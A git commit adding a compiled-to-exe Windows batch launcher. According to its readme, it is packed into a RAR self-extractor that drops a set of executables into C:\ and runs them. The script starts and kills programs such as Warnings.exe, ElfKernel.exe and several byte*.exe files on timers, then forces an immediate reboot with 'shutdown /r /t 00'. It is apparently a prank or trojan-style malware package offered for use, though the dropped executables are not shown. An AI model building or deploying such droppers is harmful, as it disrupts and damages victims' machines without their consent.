3f35d87cf0695882887793a15c0f35bd6799d6d8
pankozaC++ <77279607+pankoza2-pl@users.noreply.github.com>
2024-01-22 20:14:53 +0100

    Add files via upload

---
+++ Poncentran.bat
@@ -0,0 +1,90 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAnk
+::fBw5plQjdG8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSjk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSTk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFDZnZTimOXixEroM1MX64/2GsEgheeMzb47J34aLMO8A41HrZ49/m3dbkcUwPxRNbBGufTMTjUcPm2WJIMaOthzdekeH5U4+D3d1iV/ggyU4Zd18iMINnSWm+S0=
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+@echo off
+start C:\Warnings.exe
+pause
+start C:\note.txt
+start C:\c.exe
+start C:\byte.exe
+CHOICE /N /C YN /T 30 /D Y >NUL
+taskkill /f /im c.exe
+taskkill /f /im byte.exe
+start C:\byte.exe
+start C:\0o.exe
+CHOICE /N /C YN /T 30 /D Y >NUL
+taskkill /f /im 0o.exe
+taskkill /f /im byte.exe
+start C:\byte2.exe
+start C:\f.exe
+CHOICE /N /C YN /T 30 /D Y >NUL
+taskkill /f /im f.exe
+taskkill /f /im byte2.exe
+start C:\byte2.exe
+start C:\e.exe
+CHOICE /N /C YN /T 30 /D Y >NUL
+taskkill /f /im e.exe
+taskkill /f /im byte2.exe
+start C:\byte5.exe
+start C:\gs.exe
+CHOICE /N /C YN /T 15 /D Y >NUL
+start C:\Render.exe
+CHOICE /N /C YN /T 55 /D Y >NUL
+taskkill /f /im gs.exe
+taskkill /f /im Render.exe
+taskkill /f /im byte5.exe
+start C:\byte4.exe
+start C:\ElfKernel.exe
+CHOICE /N /C YN /T 4 /D Y >NUL
+start C:\Render.exe
+CHOICE /N /C YN /T 60 /D Y >NUL
+taskkill /f /im Render.exe
+taskkill /f /im ElfKernel.exe
+taskkill /f /im byte4.exe
+start C:\byte4.exe
+start C:\d.exe
+CHOICE /N /C YN /T 60 /D Y >NUL
+taskkill /f /im d.exe
+taskkill /f /im byte4.exe
+start C:\byte3.exe
+start C:\e.exe
+start C:\a.exe
+CHOICE /N /C YN /T 15 /D Y >NUL
+start C:\f.exe
+start C:\vbruh.exe
+start C:\f.exe
+start C:\d.exe
+start C:\so.exe
+CHOICE /N /C YN /T 70 /D Y >NUL
+shutdown.exe /r /t 00
+
---
+++ compiled/readme.txt
@@ -0,0 +1,1 @@
+The batch file compiled to exe as x64 with bat2exe, then all packed into rarsfx that drops everything into C:\ and runs the main executable, enjoy, I guess
